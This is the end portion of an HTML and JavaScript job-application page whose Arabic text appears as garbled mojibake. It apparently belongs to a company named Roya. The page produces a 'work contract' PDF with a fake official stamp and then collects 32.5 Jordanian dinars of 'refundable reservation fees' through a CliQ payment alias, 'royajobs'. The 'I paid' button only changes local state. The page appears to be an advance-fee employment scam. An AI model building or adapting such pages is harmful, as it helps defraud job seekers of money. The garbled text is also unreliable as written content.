            <div class="stamp">Ø´Ø±ÙƒØ© Ø±Ø¤ÙŠØ§<br>Ø®ØªÙ… Ø±Ø³Ù…ÙŠ</div>
          </div>
        </div>
        <button class="download-btn" onclick="downloadContract()">ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¹Ù‚Ø¯ (PDF)</button>
        <button class="download-btn" style="background:#43b968;margin-top:8px;" onclick="nextToPayment()">ØªØ£ÙƒÙŠØ¯ ÙˆÙ…ØªØ§Ø¨Ø¹Ø© Ø§Ù„Ø¯ÙØ¹</button>
        <button class="cancel-btn" onclick="cancelRequest()">Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨</button>
        `;
    }

    // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¹Ù‚Ø¯ PDF
    function downloadContract() {
      const { jsPDF } = window.jspdf;
      let c = document.getElementById('contractContent').innerText;
      let doc = new jsPDF({orientation:'p',unit:'pt',format:'a4'});
      doc.setFont("Cairo", "bold");
      doc.setFontSize(18);
      doc.text("Ø¹Ù‚Ø¯ Ø¹Ù…Ù„ Ø±Ø³Ù…ÙŠ | Ø´Ø±ÙƒØ© Ø±Ø¤ÙŠØ§", 300, 62, {align:"center"});
      doc.setFontSize(13);
      doc.text(c, 65, 120, {maxWidth:470});
      doc.text("Ø§Ù„ØªÙˆÙ‚ÙŠØ¹ ÙˆØ§Ù„Ø®ØªÙ… Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ", 65, 470);
      doc.save("Ø¹Ù‚Ø¯_Ø¹Ù…Ù„_Ø±Ø¤ÙŠØ§.pdf");
    }

    function nextToPayment() {
      let req = getRequestData();
      let r = {...req, status:"payment"};
      setRequestData(r);
      handleRequestFlow(r);
    }

    // Ø¹Ø±Ø¶ Ø§Ù„Ø¯ÙØ¹
    function showPayment(req) {
      const section = document.getElementById('paymentSection');
      section.innerHTML = `
      <div class="payment-title">Ø±Ø³ÙˆÙ… Ø­Ø¬Ø² Ù…ÙƒØ§Ù†Ùƒ Ø§Ù„ÙˆØ¸ÙŠÙÙŠ (Ù‚Ø§Ø¨Ù„Ø© Ù„Ù„Ø§Ø³ØªØ±Ø¯Ø§Ø¯)</div>
      <div class="payment-list">
        <div>Ø´Ù‡Ø§Ø¯Ø© Ø¹Ø¯Ù… Ù…Ø­ÙƒÙˆÙ…ÙŠØ© ÙÙˆØ±ÙŠØ©: 13 Ø¯.Ø£</div>
        <div>Ø¶Ø±ÙŠØ¨Ø© ÙˆØ±Ø³ÙˆÙ… Ø·ÙˆØ§Ø¨Ø¹: 14.5 Ø¯.Ø£</div>
        <div>Ø±Ø³ÙˆÙ… Ø­Ø¬Ø² ÙˆØ¥Ø¬Ø±Ø§Ø¡Ø§Øª: 5 Ø¯.Ø£</div>
      </div>
      <div class="payment-total">Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: 32.5 Ø¯ÙŠÙ†Ø§Ø± Ø£Ø±Ø¯Ù†ÙŠ</div>
      <div class="payment-instructions">
        Ù„Ø¯ÙØ¹ Ø§Ù„Ø±Ø³ÙˆÙ…: Ø§Ø³ØªØ®Ø¯Ù… ØªØ·Ø¨ÙŠÙ‚ ÙƒÙ„ÙŠÙƒ (Ø§Ù„Ø¨Ù†Ùƒ Ø§Ù„Ø£Ù‡Ù„ÙŠ)<br>
        Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ¹Ø§Ø±: <b style="color:#7f38c0;">royajobs</b>
      </div>
      <div class="payment-steps">
        - ÙŠØªÙ… Ø§Ø³ØªØ±Ø¯Ø§Ø¯ Ø§Ù„Ù…Ø¨Ù„Øº ÙÙŠ Ø­Ø§Ù„ Ø§Ù„Ø¥Ø¨Ù„Ø§Øº Ø§Ù„Ù…Ø³Ø¨Ù‚ Ø¨Ø¹Ø¯Ù… Ø§Ù„Ø­Ø¶ÙˆØ±.<br>
        - Ù„Ø§ ÙŠÙ…ÙƒÙ†Ùƒ ØªÙ‚Ø¯ÙŠÙ… Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯ Ù‚Ø¨Ù„ Ø§Ù„Ø¯ÙØ¹ Ø£Ùˆ Ø§Ù„Ø¥Ù„ØºØ§Ø¡.<br>
        - Ø£Ø±Ø³Ù„ Ø§Ù„Ù…Ø¨Ù„Øº Ø«Ù… Ø§Ø¶ØºØ· "Ù„Ù‚Ø¯ Ø¯ÙØ¹Øª".<br>
      </div>
      <button class="paid-btn" onclick="markPaid()">Ù„Ù‚Ø¯ Ø¯ÙØ¹Øª</button>
      <button class="cancel-btn" onclick="cancelRequest()">Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨</button>
      `;
    }

    // Ø¨Ø¹Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ "Ù„Ù‚Ø¯ Ø¯ÙØ¹Øª"
    function markPaid() {
      let req = getRequestData();
      let r = {...req, status:"pending", paid:true};
      setRequestData(r);
      handleRequestFlow(r);
    }

    // Ù‚ÙŠØ¯ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¯ÙØ¹
    function showPendingPayment(req) {
      const section = document.getElementById('paymentSection');
      section.innerHTML = `
      <div class="pending-message">ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ø¯ÙØ¹ØŒ Ø·Ù„Ø¨Ùƒ Ù‚ÙŠØ¯ Ø§Ù„ØªØ­Ù‚Ù‚...</div>
      <div class="info-message">Ø³ÙŠØªÙ… Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹Ùƒ Ù‚Ø±ÙŠØ¨Ù‹Ø§ Ù„Ø¥ØªÙ…Ø§Ù… Ø§Ù„ØªÙˆØ¸ÙŠÙ Ø¨Ø¥Ø°Ù† Ø§Ù„Ù„Ù‡.<br>Ø¨Ø¥Ù…ÙƒØ§Ù†Ùƒ Ù…Ø±Ø§Ø¬Ø¹Ø© Ø§Ù„Ø¹Ù‚Ø¯ ÙˆØªØ­Ù…ÙŠÙ„Ù‡ Ù…Ø¬Ø¯Ø¯Ù‹Ø§.</div>
      <button class="download-btn" onclick="downloadContract()">ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¹Ù‚Ø¯ (PDF)</button>
      <button class="again-btn" onclick="cancelRequest()">Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨ ÙˆØªÙ‚Ø¯ÙŠÙ… Ø¬Ø¯ÙŠØ¯</button>
      `;
    }

    // Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨
    function cancelRequest() {
      if(confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨ Ø¨Ø§Ù„ÙØ¹Ù„ØŸ')) {
        clearRequestData();
        notify('ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨!');
        hideAllSections();
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    }

    // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ù‚Ø³Ø§Ù… (Ù…Ø§ Ø¹Ø¯Ø§ section Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©)
    function hideAllSections() {
      ['mainSection','stepsSection','contractSection','paymentSection'].forEach(id=>{
        let sec = document.getElementById(id);
        if(sec) sec.style.display = "none";
      });
    }
    function showSection(id) {
      hideAllSections();
      document.getElementById(id).style.display = "block";
    }

    // Ø²Ø± Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±/Ø§Ù„ØªØ¬Ø±Ø¨Ø©)
    // window.clearUserData = clearUserData;
    // window.clearRequestData = clearRequestData;

    // Ø¥ØªØ§Ø­Ø© Ø¯ÙˆØ§Ù„ global Ù„Ø¨Ø¹Ø¶ Ø§Ù„Ø£Ø²Ø±Ø§Ø±
    window.applyJob = applyJob;
    window.downloadContract = downloadContract;
    window.nextToPayment = nextToPayment;
    window.markPaid = markPaid;
    window.cancelRequest = cancelRequest;
  </script>
</body>
</html>